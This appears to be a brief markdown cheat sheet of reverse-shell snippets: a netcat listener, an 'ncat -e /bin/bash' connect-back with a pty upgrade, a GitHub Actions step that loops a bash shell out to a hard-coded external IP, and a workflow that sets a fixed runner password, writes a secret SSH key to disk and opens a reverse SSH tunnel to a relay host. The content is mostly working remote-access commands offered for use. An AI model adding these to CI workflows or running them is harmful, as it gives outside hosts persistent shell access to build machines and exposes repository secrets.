# Reverse shell
- in controller server
```sh
nc -nlvp 8888
```
- in target server
```sh
ncat -e /bin/bash 127.0.0.1 8888
```
- for better terminal run
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

# GHA
```yaml
- name: reverse-shell
  shell: bash
  run: |
    sudo apt-get update -y
    sudo apt-get install -y ncat
    set +e
    while true; do ncat -e /bin/bash 35.176.8.88 8888; sleep 2; echo 'reconnecting..'; done
```

# GHA SSH
```yaml
- name: setup-ssh
  shell: bash
  run: |
    sudo apt-get update -y
    sudo apt-get install -y openssh-server
    sudo systemctl start sshd --no-pager
    sudo systemctl status sshd --no-pager
    whoami
    pwd
    echo "runner:abc1234" | sudo chpasswd
    mkdir ~/.ssh
    echo '${{ secrets.GHA_ID_RSA }}' > ~/.ssh/id_rsa
    chmod 400 ~/.ssh/id_rsa

- name: setup-ssh
  shell: bash
  run: |
    ssh -tt -o ServerAliveInterval=90 -o StrictHostKeyChecking=no -R 10022:localhost:22 "${{ vars.GHA_RELAY_SERVER }}"
```
